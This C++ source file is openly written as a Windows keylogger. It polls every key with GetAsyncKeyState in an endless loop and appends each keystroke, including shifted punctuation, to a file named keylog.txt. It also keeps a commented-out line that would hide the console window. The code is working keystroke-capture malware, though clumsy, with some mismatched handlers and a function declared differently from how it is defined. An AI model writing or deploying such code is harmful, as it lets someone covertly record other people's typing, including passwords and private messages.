#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;
//bool x1,y1,x2,y2,x3,y3,x4,y4,x5,y5,x6,y6,x7,y7,x8,y8,x9,y9,y11,x11;
bool x, y;

void Log(string input){
	fstream LogFile;
	LogFile.open("keylog.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int);
int keylog1(bool ,bool);  // ~
int keylog2(bool ,bool);  // '
int keylog3(bool ,bool); // ]
int keylog4(bool ,bool);  // [
int keylog5(bool ,bool);  // - 
int keylog6(bool ,bool);  // =
int keylog7(bool ,bool);  // ;
int keylog8(bool ,bool);  // "\"
int keylog9(bool ,bool);  // /
int keylog10(bool ,bool);  //  .
int keylog11(bool ,bool);  // ,
int extra();
bool OEM_3 = false; // ~
bool OEM_6 = false; //]
bool OEM_4 = false; //[
bool OEM_MINUS =false; // -
bool OEM_1 = false; //;
bool OEM_5 = false; // "\"
bool OEM_2 = false; // /
bool OEM_PERIOD = false; //.
bool OEM_COMMA = false; //,
bool OEM_PLUS = false; //=
bool OEM_7 = false; // "

int main(){
	
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY;
	
	while (true) {
		//Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++){
			if(GetAsyncKeyState(VK_SHIFT) == -32768 ){
				if (GetAsyncKeyState(KEY) == -32767 ){
					fstream LogFile;
					LogFile.open("keylog.txt", fstream::app);
					
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
			else if (GetAsyncKeyState(KEY) == -32767){ //When you press.
				if (SpecialKeys(KEY) == false){ //check S_Key.

					fstream LogFile;
					LogFile.open("keylog.txt", fstream::app);
					
					if (LogFile.is_open()) {
						LogFile << char(KEY+32);
						LogFile.close();
					}	
				}
			}
		extra();
		}
	}
	return 0;
}

bool SpecialKeys(int S_Key){
	switch (S_Key){
	case VK_BACK:
		cout << " delete ";
		Log(" delete ");
		return true;
	case VK_TAB:
		cout << "	";
		Log("	");
		return true;
	case VK_SPACE:
		cout << " ";
		Log(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		Log("\n");
		return true;
	case VK_NUMPAD0:
		cout << "0";
		Log("0");
		return true;
	case VK_NUMPAD1:
		cout << "1";
		Log("1");
		return true;
	case VK_NUMPAD2:
		cout << "2";
		Log("2");
		return true;
	case VK_NUMPAD3:
		cout << "3";
		Log("3");
		return true;
	case VK_NUMPAD4:
		cout << "4";
		Log("4");
		return true;
	case VK_NUMPAD5:
		cout << "5";
		Log("5");
		return true;
	case VK_NUMPAD6:
		cout << "6";
		Log("6");
		return true;
	case VK_NUMPAD7:
		cout << "7";
		Log("7");
		return true;
	case VK_NUMPAD8:
		cout << "8";
		Log("8");
		return true;
	case VK_NUMPAD9:
		cout << "9";
		Log("9");
		return true;
	case VK_ADD:
		cout << "+";
		Log("+");
		return true;
	case VK_SUBTRACT:
		cout << "-";
		Log("-");
		return true;
	default: 
		return false;
	}
}

int keylog1(){ //VK_OEM_3
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("~");
	LogFile.close();
}

int keylog2(bool x ,bool y){ //VK_OEM_7   "
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("\"");
		}
		else if ( x == false && y == true ){
			Log("'");
		}
	}
	LogFile.close();
}

int keylog3(bool x ,bool y){ //VK_OEM_6
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("}");
		}
		else if ( x == false && y == true ){
			Log("]");
		}
	}
	LogFile.close();
}

int keylog4(bool x ,bool y){ //VK_OEM_4
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("{");
		}
		else if ( x == false && y == true ){
			Log("[");
		}
	}
	LogFile.close();
}

int keylog5(bool x ,bool y){ //VK_OEM_MINUS
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("_");
		}
		else if ( x == false && y == true ){
			Log("-");
		}
	}
	LogFile.close();
}

int keylog6(bool x ,bool y){ //VK_OEM_PLUS
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("+");
		}
		else if ( x == false && y == true ){
			Log("=");
		}
	}
	LogFile.close();
}

int keylog7(bool x ,bool y){ //VK_OEM_1
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log(":");
		}
		else if ( x == false && y == true ){
			Log(";");
		}
	}
	LogFile.close();
}

int keylog8(bool x ,bool y){ //VK_OEM_5
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("|");
		}
		else if ( x == false && y == true ){
			Log("\\");
		}
	}
	LogFile.close();
}

int keylog9(bool x ,bool y){ //VK_OEM_2
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("?");
		}
		else if ( x == false && y == true ){
			Log("/");
		}
	}
	LogFile.close();
}

int keylog10(bool x ,bool y){ //VK_OEM_PERIOD
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log(">");
		}
		else if ( x == false && y == true ){
			Log(".");
		}
	}
	LogFile.close();
}

int keylog11(bool x ,bool y){ //VK_EOM_COMMA
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	if (LogFile.is_open()){
		if ( x == true && y == true){
			Log("<");
		}
		else if ( x == false && y == true ){
			Log(",");
		}
	}
	LogFile.close();
}



int extra(){
	  if (GetAsyncKeyState(VK_OEM_3) < 0 && OEM_3 == false)
    {
      //Press down
      OEM_3 = true;
      keylog1();
      cout << "[Change Language]" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_3) >= 0 && OEM_3 == true){
      //Release
      OEM_3 = false;

    	}
	//////////////////////////////////////////////////////////
	
	if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_6) < 0 && OEM_6 == false){
     		//Press down
      		OEM_6 = true;
      		x = true;
      		y = true;
      		keylog3(x , y);
      		cout << x << endl << y << endl;
      		cout << "}" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_6) >= 0 && OEM_6 == true){
      		//Release
      		OEM_6 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_6) < 0 && OEM_6 == false){
      		//Press down
      		OEM_6 = true;
      		x = false;
    		y = true;
      		keylog3(x , y);
      		cout << x << endl << y << endl;
      		cout << "]" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_6) >= 0 && OEM_6 == true){
      		//Release
      		OEM_6 = false;
    	}
	//////////////////////////////////////////////////////////	 
		  
		  if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_4) < 0 && OEM_4 == false){
     		//Press down
      		OEM_4 = true;
      		x = true;
      		y = true;
      		keylog4(x , y);
      		cout << x << endl << y << endl;
      		cout << "{" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_4) >= 0 && OEM_4 == true){
      		//Release
      		OEM_4 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_4) < 0 && OEM_4 == false){
      		//Press down
      		OEM_4 = true;
      		x = false;
    		y = true;
      		keylog4(x , y);
      		cout << x << endl << y << endl;
      		cout << "[" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_4) >= 0 && OEM_4 == true){
      		//Release
      		OEM_4 = false;
    	}
	//////////////////////////////////////////////////////////
		
		 if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_1) < 0 && OEM_1 == false){
     		//Press down
      		OEM_1 = true;
      		x = true;
      		y = true;
      		keylog7(x , y);
      		cout << x << endl << y << endl;
      		cout << ":" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_1) >= 0 && OEM_1 == true){
      		//Release
      		OEM_1 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_1) < 0 && OEM_1 == false){
      		//Press down
      		OEM_1 = true;
      		x = false;
    		y = true;
      		keylog7(x , y);
      		cout << x << endl << y << endl;
      		cout << ";" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_1) >= 0 && OEM_1 == true){
      		//Release
      		OEM_1 = false;
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_5) < 0 && OEM_5 == false){
     		//Press down
      		OEM_5 = true;
      		x = true;
      		y = true;
      		keylog8(x , y);
      		cout << x << endl << y << endl;
      		cout << "|" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_5) >= 0 && OEM_5 == true){
      		//Release
      		OEM_5 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_5) < 0 && OEM_5 == false){
      		//Press down
      		OEM_5 = true;
      		x = false;
    		y = true;
      		keylog8(x , y);
      		cout << x << endl << y << endl;
      		cout << "\\"
			   << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_5) >= 0 && OEM_5 == true){
      		//Release
      		OEM_5 = false;
    	}
	//////////////////////////////////////////////////////////
	if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_2) < 0 && OEM_2 == false){
     		//Press down
      		OEM_2 = true;
      		x = true;
      		y = true;
      		keylog9(x , y);
      		cout << x << endl << y << endl;
      		cout << "?" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_2) >= 0 && OEM_2 == true){
      		//Release
      		OEM_2 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_2) < 0 && OEM_2 == false){
      		//Press down
      		OEM_2 = true;
      		x = false;
    		y = true;
      		keylog9(x , y);
      		cout << x << endl << y << endl;
      		cout << "/" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_2) >= 0 && OEM_2 == true){
      		//Release
      		OEM_2 = false;
    	}
	//////////////////////////////////////////////////////////
		
		 if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_MINUS) < 0 && OEM_MINUS == false){
     		//Press down
      		OEM_MINUS = true;
      		x = true;
      		y = true;
      		keylog5(x , y);
      		cout << x << endl << y << endl;
      		cout << "_" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_MINUS) >= 0 && OEM_MINUS == true){
      		//Release
      		OEM_MINUS = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_MINUS) < 0 && OEM_MINUS == false){
      		//Press down
      		OEM_MINUS = true;
      		x = false;
    		y = true;
      		keylog5(x , y);
      		cout << x << endl << y << endl;
      		cout << "-" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_MINUS) >= 0 && OEM_MINUS == true){
      		//Release
      		OEM_MINUS = false;
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_PERIOD) < 0 && OEM_PERIOD == false){
     		//Press down
      		OEM_PERIOD = true;
      		x = true;
      		y = true;
      		keylog10(x , y);
      		cout << x << endl << y << endl;
      		cout << ">" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_PERIOD) >= 0 && OEM_PERIOD == true){
      		//Release
      		OEM_PERIOD = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_PERIOD) < 0 && OEM_PERIOD == false){
      		//Press down
      		OEM_PERIOD = true;
      		x = false;
    		y = true;
      		keylog10(x , y);
      		cout << x << endl << y << endl;
      		cout << "." << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_PERIOD) >= 0 && OEM_PERIOD == true){
      		//Release
      		OEM_PERIOD = false;
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_COMMA) < 0 && OEM_COMMA == false){
     		//Press down
      		OEM_COMMA = true;
      		x = true;
      		y = true;
      		keylog11(x , y);
      		cout << x << endl << y << endl;
      		cout << ">" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_COMMA) >= 0 && OEM_COMMA == true){
      		//Release
      		OEM_PERIOD = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_COMMA) < 0 && OEM_COMMA == false){
      		//Press down
      		OEM_COMMA = true;
      		x = false;
    		y = true;
      		keylog11(x , y);
      		cout << x << endl << y << endl;
      		cout << "," << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_COMMA) >= 0 && OEM_COMMA == true){
      		//Release
      		OEM_COMMA = false;
    	} 
	///////////////////////////////////////////////////////
		
		if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_PLUS) < 0 && OEM_PLUS == false){
     		//Press down
      		OEM_PLUS = true;
      		x = true;
      		y = true;
      		keylog6(x , y);
      		cout << x << endl << y << endl;
      		cout << "+" << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_PLUS) >= 0 && OEM_PLUS == true){
      		//Release
      		OEM_PLUS = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_PLUS) < 0 && OEM_PLUS == false){
      		//Press down
      		OEM_PLUS = true;
      		x = false;
    		y = true;
      		keylog6(x , y);
      		cout << x << endl << y << endl;
      		cout << "=" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_PLUS) >= 0 && OEM_PLUS == true){
      		//Release
      		OEM_PLUS = false;
    	}
    /////////////////////////////////////////////////////////
    
    if (GetAsyncKeyState(VK_SHIFT) == -32768){
		if (GetAsyncKeyState(VK_OEM_7) < 0 && OEM_7 == false){
     		//Press down
      		OEM_7 = true;
      		x = true;
      		y = true;
      		keylog2(x , y);
      		cout << x << endl << y << endl;
      		cout <<  """"
			   << endl;
   		 }
    	if (GetAsyncKeyState(VK_OEM_7) >= 0 && OEM_7 == true){
      		//Release
      		OEM_7 = false;
    	}
	}
	else if (GetAsyncKeyState(VK_OEM_7) < 0 && OEM_7 == false){
      		//Press down
      		OEM_7 = true;
      		x = false;
    		y = true;
      		keylog2(x , y);
      		cout << x << endl << y << endl;
      		cout << "'" << endl; 
    }
	if (GetAsyncKeyState(VK_OEM_7) >= 0 && OEM_7 == true){
      		//Release
      		OEM_7 = false;
    	}
    /////////////////////////////////////////////////////////
}
